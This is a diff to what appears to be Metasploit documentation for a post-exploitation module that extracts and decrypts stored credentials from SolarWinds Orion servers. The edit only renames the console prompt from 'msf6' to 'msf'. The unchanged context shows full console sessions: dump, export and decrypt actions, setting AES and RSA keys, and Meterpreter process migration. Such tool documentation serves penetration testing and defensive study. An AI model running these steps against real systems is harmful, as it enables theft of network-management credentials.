@@ -139,10 +139,10 @@ using SQL native auth, replace the `-E` parameter with
 Windows Server 2019 host running Orion NPM 2020 using the `dump` action:
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/solarwinds_orion_dump
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set session 1
+msf exploit(multi/handler) > use post/windows/gather/credentials/solarwinds_orion_dump
+msf post(windows/gather/credentials/solarwinds_orion_dump) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump
+msf post(windows/gather/credentials/solarwinds_orion_dump) > dump
 
 [*] Hostname WINNING IPv4 192.168.101.125
 [*] SolarWinds Orion Build 2020.2.65120.0
@@ -177,7 +177,7 @@ msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump
 [+] 6 unique CredentialID records recovered
 [+] Decrypted SolarWinds Orion Database Dump: /root/.msf4/loot/20221118093912_default_192.168.101.125_solarwinds_orion_067745.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) >
+msf post(windows/gather/credentials/solarwinds_orion_dump) >
 ```
 
 Host with MSSQL SSPI authentication configured for external database - use `dump` to
@@ -186,10 +186,10 @@ the SQL server. Perform `export` to acquire the encrypted data, then perform `de
 to produce the plaintext:
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/solarwinds_orion_dump
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set session 1
+msf exploit(multi/handler) > use post/windows/gather/credentials/solarwinds_orion_dump
+msf post(windows/gather/credentials/solarwinds_orion_dump) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump
+msf post(windows/gather/credentials/solarwinds_orion_dump) > dump
 
 [*] Hostname WINNING IPv4 192.168.101.125
 [*] SolarWinds Orion Build 2020.2.65120.0
@@ -217,15 +217,15 @@ msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump
 [-] No records exported from SQL server
 [-] Post aborted due to failure: unknown: Could not export SolarWinds Orion database records
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set AES_KEY 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
+msf post(windows/gather/credentials/solarwinds_orion_dump) > set AES_KEY 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
 AES_KEY => 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set RSA_KEY_FILE /root/.msf4/loot/20221118091221_default_192.168.101.125_orionssl_457287.key
+msf post(windows/gather/credentials/solarwinds_orion_dump) > set RSA_KEY_FILE /root/.msf4/loot/20221118091221_default_192.168.101.125_orionssl_457287.key
 RSA_KEY_FILE => /root/.msf4/loot/20221118091221_default_192.168.101.125_orionssl_457287.key
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set MSSQL_INSTANCE tcp:cornflakes.cesium137.io
+msf post(windows/gather/credentials/solarwinds_orion_dump) > set MSSQL_INSTANCE tcp:cornflakes.cesium137.io
 MSSQL_INSTANCE => tcp:cornflakes.cesium137.io
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set MSSQL_DB SolarWindsOrion
+msf post(windows/gather/credentials/solarwinds_orion_dump) > set MSSQL_DB SolarWindsOrion
 MSSQL_DB => SolarWindsOrion
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > sessions -i 1
+msf post(windows/gather/credentials/solarwinds_orion_dump) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > ps
@@ -246,7 +246,7 @@ meterpreter > migrate 10704
 [*] Migration completed successfully.
 meterpreter > bg
 [*] Backgrounding session 1...
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > export
+msf post(windows/gather/credentials/solarwinds_orion_dump) > export
 
 [*] Hostname WINNING IPv4 192.168.101.125
 [*] SolarWinds Orion Build 2020.2.65120.0
@@ -267,9 +267,9 @@ msf6 post(windows/gather/credentials/solarwinds_orion_dump) > export
 [+] 10 rows exported, 6 unique CredentialIDs
 [+] Encrypted SolarWinds Orion Database Dump: /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_orion_412973.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set CSV_FILE /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_orion_412973.txt
+msf post(windows/gather/credentials/solarwinds_orion_dump) > set CSV_FILE /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_orion_412973.txt
 CSV_FILE => /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_orion_412973.txt
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) > decrypt 
+msf post(windows/gather/credentials/solarwinds_orion_dump) > decrypt 
 
 [*] Hostname WINNING IPv4 192.168.101.125
 [*] SolarWinds Orion Build 2020.2.65120.0
@@ -287,5 +287,5 @@ msf6 post(windows/gather/credentials/solarwinds_orion_dump) > decrypt
 [+] 6 unique CredentialID records recovered
 [+] Decrypted SolarWinds Orion Database Dump: /root/.msf4/loot/20221118091959_default_192.168.101.125_solarwinds_orion_687493.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/solarwinds_orion_dump) >
+msf post(windows/gather/credentials/solarwinds_orion_dump) >
 ```
